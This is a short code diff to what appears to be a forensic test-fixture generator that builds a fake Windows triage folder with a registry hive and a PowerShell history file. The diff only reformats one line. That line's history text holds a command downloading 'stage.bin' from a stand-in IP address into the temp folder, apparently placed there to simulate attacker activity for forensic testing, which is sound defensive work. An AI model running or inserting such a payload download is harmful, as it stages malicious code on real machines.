@@ -293,7 +293,9 @@ def write_triage(root: str | os.PathLike) -> Path:
     (user / "NTUSER.DAT").write_bytes(build_hive(NTUSER, "CMI-CreateHive{NTUSER}"))
     history = user / "AppData" / "Roaming" / "Microsoft" / "Windows" / "PowerShell" / "PSReadLine"
     history.mkdir(parents=True, exist_ok=True)
-    (history / "ConsoleHost_history.txt").write_text("Get-Process\nInvoke-WebRequest http://198.51.100.7/stage.bin -OutFile $env:TEMP\\stage.bin\n", encoding="utf-8")
+    (history / "ConsoleHost_history.txt").write_text(
+        "Get-Process\nInvoke-WebRequest http://198.51.100.7/stage.bin -OutFile $env:TEMP\\stage.bin\n", encoding="utf-8"
+    )
     return base
 
 
